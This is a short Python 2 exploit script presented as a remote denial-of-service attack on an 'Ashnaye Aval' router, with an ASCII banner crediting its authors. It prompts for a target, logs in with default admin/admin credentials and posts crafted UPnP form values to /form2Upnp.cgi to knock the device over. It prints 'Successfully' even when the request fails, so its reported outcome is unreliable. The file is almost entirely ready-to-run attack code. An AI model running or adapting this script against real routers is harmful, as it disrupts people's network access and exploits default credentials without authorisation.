#!/usr/bin/python
# Ashnaye Aval DOS Router - Denial of Service
# Author : Guardiran Security Team
# Date : 5/25/2017
# Tested on: Windows 10
# Demo : https://youtu.be/jO9JeOEYUkE
# Exploitation Technique : Remote
# CVE : -

import urllib2
import urllib
import os

_=os.system("cls") , os.system('color c')

print '''
 ______   _______  _______                                                   
|      | |       ||       |           **********************************                                  
|  _    ||   _   ||  _____|           * Exploited By : DeMoN           *            
| | |   ||  | |  || |_____            * Team : Guardiran Security Team *                                    
| |_|   ||  |_|  ||_____  |           * Tel : mrar1yan                 *                      
|       ||       | _____| |           **********************************                                      
|______| |_______||_______|                                                  
             _______  _______  __   __  __    _  _______  __   __  _______   
            |   _   ||       ||  | |  ||  |  | ||   _   ||  | |  ||       |  
            |  |_|  ||  _____||  |_|  ||   |_| ||  |_|  ||  |_|  ||    ___|  
            |       || |_____ |       ||       ||       ||       ||   |___   
            |       ||_____  ||       ||  _    ||       ||_     _||    ___|  
            |   _   | _____| ||   _   || | |   ||   _   |  |   |  |   |___   
            |__| |__||_______||__| |__||_|  |__||__| |__|  |___|  |_______|  
                                 _______  __   __  _______  ___              
                                |   _   ||  | |  ||   _   ||   |             
                                |  |_|  ||  |_|  ||  |_|  ||   |             
                                |       ||       ||       ||   |             
                                |       ||       ||       ||   |___          
                                |   _   | |     | |   _   ||       |         
                                |__| |__|  |___|  |__| |__||_______|  
								       
'''
site=raw_input("Enter Url : ") #Enter Target Ip Address With Http://
site=site+"/form2Upnp.cgi"
username='admin'
password='admin'
p = urllib2.HTTPPasswordMgrWithDefaultRealm()
p.add_password(None, site, username, password)
handler = urllib2.HTTPBasicAuthHandler(p)
opener = urllib2.build_opener(handler)
urllib2.install_opener(opener)
 
post = {'daemon':' ','ext_if':'pppoe+1','submit.htm?upnp.htm':'Send'}
data = urllib.urlencode(post)
try:
    html = urllib2.urlopen(site,data)
    print ("Successfully :)")
except:
    print ("Successfully :)")